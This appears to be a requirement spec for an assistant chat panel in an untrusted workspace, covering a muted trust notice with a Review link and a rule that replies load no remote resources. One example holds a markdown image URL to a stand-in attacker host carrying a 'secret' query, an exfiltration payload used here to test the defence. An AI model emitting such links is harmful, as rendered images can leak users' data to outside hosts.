# assistant.chat.authoring-only

- Status: active
- Since: unreleased
- Source: HAL-17335 (T14 PR 7c); states H17 (HAL-5896); flow-assistant 5.9 (HAL-647); HAL-720 conditions 4 and 8; Julian's sign-off on HAL-17474

While the host says a chat answers with the authoring tools only (the workspace isn't trusted and the chat is a Build chat on the person's own Settings › Assistant model), the panel shall show under the box, in `fg-muted`, "Not trusted yet · it can read and propose, but not run anything." with **Review**, which opens the window's trust check, and shall drop the line when the host says the workspace's trust changed and the chat no longer answers that way. A reply shall load no remote image or other remote resource: an image shows as its text.

## Examples

- Given an untrusted workspace and a Build chat on the Settings › Assistant model,
  then the line shows under the box, and Review opens the trust check.
- Given that line, when the person trusts the workspace,
  then the line goes.
- Given a reply with `![chart](https://evil.example/c?d=secret)`,
  then no image loads and the text shows as it is.
